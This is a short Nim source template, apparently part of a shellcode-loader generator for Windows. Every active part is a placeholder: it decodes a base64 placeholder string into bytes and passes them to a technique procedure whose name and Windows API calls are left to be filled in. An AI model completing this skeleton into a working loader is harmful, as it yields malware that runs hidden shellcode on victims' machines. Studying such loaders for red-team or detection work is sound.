import base64, endians
import winim
import winim/lean

REPLACE_INIT_SETUP

proc REPLACE_TECHNIQUE_NAME[byte](shellcode: openArray[byte]): void =
REPLACE_API_CALLS

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "REPLACE_SHELLCODE"
  let shellcode = toByteSeq(decode(enc))
  REPLACE_TECHNIQUE_NAME(shellcode)

